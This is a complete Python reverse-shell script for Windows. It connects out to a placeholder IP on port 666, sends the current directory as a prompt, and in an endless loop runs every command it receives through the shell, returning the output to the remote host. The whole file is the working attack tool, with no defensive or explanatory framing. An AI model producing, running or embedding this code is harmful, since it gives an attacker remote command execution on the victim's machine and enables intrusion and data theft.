import os
import socket
import subprocess

ip = 'IP'
port = 666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))


def send_path():
    cmd = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE).stdout.read().decode().replace('\r\n', '') + '>'
    s.sendto(cmd.encode(), (ip, port))


send_path()
while True:
    # wait the command
    command = s.recv(1000).decode()
    if "cd" in command:
        dirs = os.getcwd()
        if ".." in command:
            c = command.count("..")
            dirs = dirs.split("\\")
            for i in range(c):
                dirs.pop(len(dirs) - 1)
            dirs = '\\'.join(dirs)
        elif ":" in command:
            dirs = command.replace("cd ", "")
        else:
            change = command.replace("cd ", "")
            dirs += change
        try:
            os.chdir(dirs)
        except WindowsError:
            pass
        s.send('\n'.encode())
    else:
        command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # get output and errors
        o = command.stdout.read().decode('utf-8', 'ignore')
        e = command.stderr.read().decode('utf-8', 'ignore')
        # send result
        if o != '':
            s.sendto(o.encode(errors='ignore'), (ip, port))
        else:
            if e != '':
                s.sendto(e.encode(errors='ignore'), (ip, port))
            else:
                s.send('\n'.encode())
    # send path
    send_path()

